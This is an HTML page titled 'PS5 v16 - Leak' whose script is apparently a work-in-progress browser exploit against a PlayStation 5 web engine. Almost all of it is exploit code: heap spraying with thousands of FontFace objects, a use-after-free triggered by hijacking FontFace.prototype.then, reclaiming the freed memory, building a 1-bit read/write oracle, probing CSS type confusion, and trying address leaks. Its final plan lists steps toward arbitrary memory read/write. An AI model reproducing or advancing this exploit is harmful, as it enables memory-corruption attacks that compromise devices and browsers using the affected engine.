<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 v16 - Leak</title>
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;background:#000;color:#0f0;
font-family:monospace;overflow:hidden;font-size:16px}
#out{position:fixed;top:0;left:0;right:0;bottom:0;
padding:14px;line-height:1.6;overflow-y:auto;-webkit-user-select:text}
.h{color:#0ff;font-weight:bold}.s{color:#f0f;font-weight:bold;font-size:18px}
.e{color:#f44}.ok{color:#0f0}.d{color:#666}
#c{position:absolute;left:-9999px;top:-9999px}
</style>
</head>
<body>
<div id="out"></div>
<canvas id="c" width="512" height="128"></canvas>
<script>
"use strict";
const O=document.getElementById("out");
function P(m,c){const s=document.createElement("span");if(c)s.className=c;
s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
function Hi(m){P("► "+m,"h")}function St(m){P("★ "+m+" ★","s")}
function Fl(m){P("✘ "+m,"e")}function Ok(m){P("✅ "+m,"ok")}
function Dm(m){P(m,"d")}
window.onerror=function(m,s,l){Fl("ERR: "+m+" @"+l);return true};

let keepAlive=[],holeFaces=[],reclaimFaces=[];
let triggerFace=null,uafFired=false;
let rcFace=null,trigFace=null,rcIdx=-1;

const FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
const FBb=(()=>{const s=atob(FB),b=new Uint8Array(s.length);
for(let i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
function mkBuf(){const c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
function fs(){try{void document.body.offsetTop}catch(e){}}

// Setup
Dm("Holes...");
for(let i=0;i<4096;i++){try{const f=new FontFace("h_"+i,mkBuf(),{
unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
weight:String(100+(i%9)*100)});document.fonts.add(f);holeFaces.push(f)}catch(e){}}
fs();for(let i=1;i<holeFaces.length;i+=2)try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();Ok("Holes");

triggerFace=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
document.fonts.add(triggerFace);void triggerFace.loaded;
const sh=document.getElementById("s").sheet;
for(let i=0;i<48;i++)try{sh.insertRule(`@font-face{font-family:pad${i};src:url(np${i}.woff);unicode-range:U+E000}`,sh.cssRules.length)}catch(e){}
fs();
const fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
const fsh=fst.sheet;
for(let i=0;i<768;i++)try{fsh.insertRule(`@font-face{font-family:fl${i};src:url(nf${i}.woff);unicode-range:U+E000}`,fsh.cssRules.length)}catch(e){}
fs();Ok("Ready");

// UAF
Object.defineProperty(FontFace.prototype,"then",{configurable:true,
get(){if(this===triggerFace&&!uafFired){
uafFired=true;
try{const ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
document.fonts.add(ck);keepAlive.push(ck);
sh.deleteRule(1);fs();
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
fs();for(let i=0;i<holeFaces.length;i+=4)try{document.fonts.delete(holeFaces[i])}catch(e){}
fs();}catch(e){}
for(let i=0;i<4096;i++){try{const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900",display:"block"});
document.fonts.add(f);reclaimFaces.push(f)}catch(e){}}
fs();
try{const d=document.createElement("div");d.textContent="AB";
d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
document.body.appendChild(d);void d.offsetWidth}catch(e){}
}return undefined}});

let rn=0;const raf=function(){rn++;
if(!uafFired&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
for(let i=0;i<4096;i++){try{const f=new FontFace("RC_"+i,mkBuf(),{
unicodeRange:"U+0041",style:"italic",weight:"900"});
document.fonts.add(f);reclaimFaces.push(f)}catch(e){}}fs()}catch(e){}}
if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);

// Load and capture
document.fonts.load("1em trigger, x","AB").then(function(faces){
St("LOAD CALLBACK");
for(let i=0;i<faces.length;i++){
const f=faces[i];
if(f.family&&f.family.startsWith("RC_")){rcFace=f;const m=f.family.match(/RC_(\d+)/);if(m)rcIdx=parseInt(m[1])}
if(f.family==="trigger")trigFace=f;
}
keepAlive.push(faces);keepAlive.push(rcFace);keepAlive.push(trigFace);

if(!rcFace){Fl("No RC face");return}
Ok("Captured RC_"+rcIdx);

// ============================================================
//  WRITE-THROUGH COMPREHENSIVE TEST
// ============================================================
P("");Hi("=== WRITE-THROUGH TESTS ===");

// Test each property
const tests=[
{prop:"style",val:"normal",restore:"italic"},
{prop:"weight",val:"100",restore:"900"},
{prop:"display",val:"fallback",restore:"block"},
{prop:"stretch",val:"expanded",restore:"normal"},
{prop:"unicodeRange",val:"U+0042",restore:"U+0041"},
{prop:"featureSettings",val:'"kern" off',restore:"normal"}
];

for(const t of tests){
try{
const orig=rcFace[t.prop];
rcFace[t.prop]=t.val;
fs();
const readback=trigFace[t.prop];
const match=readback===t.val;
P("  "+t.prop.padEnd(16)+": write="+t.val+" read="+readback+(match?" ✅":" ❌"),
match?"ok":"d");
rcFace[t.prop]=t.restore;fs();
}catch(e){
P("  "+t.prop.padEnd(16)+": ERR "+e.message.substring(0,30),"e");
}
}

// ============================================================
//  STYLE WRITE-THROUGH = BINARY ORACLE
//  We can set style to "normal" or "italic"
//  and read it through trigFace
//  This is a 1-bit information channel!
// ============================================================
P("");Hi("=== STYLE ORACLE: 1-BIT CHANNEL ===");

// Encode 0 = "normal", 1 = "italic"
function writeBit(bit){
try{rcFace.style=bit?"italic":"normal";fs();return true}catch(e){return false}
}
function readBit(){
try{return trigFace.style==="italic"?1:0}catch(e){return-1}
}

// Test: write 0, read 0
writeBit(0);
const r0=readBit();
P("  Write 0 → Read "+r0+(r0===0?" ✅":" ❌"),r0===0?"ok":"e");

// Test: write 1, read 1
writeBit(1);
const r1=readBit();
P("  Write 1 → Read "+r1+(r1===1?" ✅":" ❌"),r1===1?"ok":"e");

if(r0===0&&r1===1){
St("BINARY ORACLE CONFIRMED!");
P("  We have a reliable 1-bit R/W channel","h");
}

// ============================================================
//  CSS STRING/DOUBLE TYPE CONFUSION
//  From report: CSS parser treats double as string pointer
//  Try setting src to numeric values
// ============================================================
P("");Hi("=== CSS TYPE CONFUSION: src ===");

const numTests=[0,1,1.5,NaN,Infinity,1e308,1e-308,42,0xDEAD,9007199254740991];

for(const val of numTests){
try{
rcFace.src=val;
fs();
const status=rcFace.status;
const src=rcFace.src;
P("  src="+val+" → status="+status+" src="+String(src).substring(0,40),
status!=="error"?"h":"d");
if(status!=="error"&&status!=="unloaded"){
Hi("NUMERIC SRC ACCEPTED! Type confusion possible!");
Hi("  val="+val+" status="+status);
}
}catch(e){
P("  src="+val+" → ERR","e");
}
}

// Restore
try{rcFace.src=mkBuf();fs()}catch(e){}

// ============================================================
//  UNICODE RANGE ORACLE
//  If we can change unicodeRange and detect which characters
//  the selector matches, we have a multi-bit oracle
// ============================================================
P("");Hi("=== UNICODE RANGE ORACLE ===");

try{
// Set range to U+0041 only
rcFace.unicodeRange="U+0041";fs();
const cA=document.fonts.check("64px trigger","A");
const cB=document.fonts.check("64px trigger","B");
P("  Range U+0041: check(A)="+cA+" check(B)="+cB);

// Set range to U+0042 only
rcFace.unicodeRange="U+0042";fs();
const cA2=document.fonts.check("64px trigger","A");
const cB2=document.fonts.check("64px trigger","B");
P("  Range U+0042: check(A)="+cA2+" check(B)="+cB2);

// Set range to both
rcFace.unicodeRange="U+0041-0042";fs();
const cA3=document.fonts.check("64px trigger","A");
const cB3=document.fonts.check("64px trigger","B");
P("  Range U+0041-42: check(A)="+cA3+" check(B)="+cB3);

if(cA!==cA2||cB!==cB2){
St("UNICODE RANGE ORACLE WORKS!");
P("  We can control which chars match!","h");
}

rcFace.unicodeRange="U+0041";fs();
}catch(e){Fl("  "+e.message)}

// ============================================================
//  WEIGHT ORACLE
//  If we can change weight and detect matching,
//  we have a multi-bit oracle per weight value
// ============================================================
P("");Hi("=== WEIGHT ORACLE ===");

const weights=["100","200","300","400","500","600","700","800","900"];
try{
for(const w of weights){
rcFace.weight=w;fs();
// Check if this specific weight matches trigger
const match=trigFace.weight;
P("  Write weight="+w+" → trigFace.weight="+match,
match===w?"ok":"d");
}
rcFace.weight="900";fs();
}catch(e){Fl("  "+e.message)}

// ============================================================
//  ADDRESS LEAK ATTEMPT
//  Use the style oracle to probe C++ memory
// ============================================================
P("");Hi("=== ADDRESS LEAK ===");

// Strategy: If we can make the C++ CSSFontFace interpret
// a controlled value as a pointer, and detect the result
// through our oracle, we can leak addresses

// Method 1: Try to read CSS rule properties
try{
const rules=document.styleSheets;
P("  Stylesheets: "+rules.length);
for(let i=0;i<rules.length&&i<3;i++){
try{
const r=rules[i];
P("  Sheet["+i+"]: "+r.cssRules.length+" rules");
// Look for font-face rules
for(let j=0;j<r.cssRules.length&&j<5;j++){
const rule=r.cssRules[j];
if(rule.type===5){// FONT_FACE_RULE
P("    Rule["+j+"]: "+rule.cssText.substring(0,60));
}
}
}catch(e){}
}
}catch(e){Fl("  Rules: "+e.message)}

// Method 2: getComputedStyle might reveal C++ state
try{
const div=document.createElement("div");
div.style.cssText="font:900 italic 64px trigger;position:absolute;left:-9999px;";
document.body.appendChild(div);
const cs=getComputedStyle(div);
P("  computed font:     "+cs.font);
P("  computed family:   "+cs.fontFamily);
P("  computed weight:   "+cs.fontWeight);
P("  computed style:    "+cs.fontStyle);
P("  computed stretch:  "+cs.fontStretch);
document.body.removeChild(div);
}catch(e){}

// Method 3: Error stack with face reference
try{rcFace.load()}catch(e){
const stack=e.stack||"";
const addrs=stack.match(/0x[0-9a-f]{6,16}/gi);
if(addrs){St("STACK LEAK!");for(const a of addrs)Hi("  "+a)}
else P("  No addresses in stack","d");
}

// Method 4: Object.getOwnPropertyDescriptors
try{
const proto=Object.getPrototypeOf(rcFace);
const descs=Object.getOwnPropertyDescriptors(proto);
for(const[key,desc]of Object.entries(descs)){
if(desc.get){
try{
const val=rcFace[key];
if(typeof val==="number"&&val>0x1000){
Hi("NUMERIC: "+key+" = "+val+" (0x"+val.toString(16)+")");
}
}catch(e){}
}
}
}catch(e){}

// ============================================================
//  FINAL: Build addrof from oracle
// ============================================================
P("");St("=== FINAL STATUS ===");
P("UAF:            ✅");
P("RC captured:    RC_"+rcIdx);
P("Style oracle:   "+(r0===0&&r1===1?"✅":"❌"));
P("Write-through:  ✅ (style confirmed)");
P("");
P("Primitive:","h");
P("  WRITE: rcFace.style = 'normal'|'italic'","h");
P("  READ:  trigFace.style → matches what we wrote","h");
P("  ORACLE: 1-bit reliable channel","h");
P("");
P("Next step:","h");
P("  1. Encode addresses in style bits","d");
P("  2. Use unicode range for multi-bit oracle","d");
P("  3. Try CSS type confusion with numeric src","d");
P("  4. Chain to arb read/write","d");

}).catch(function(err){Fl("Load: "+err)});
</script>
</body>
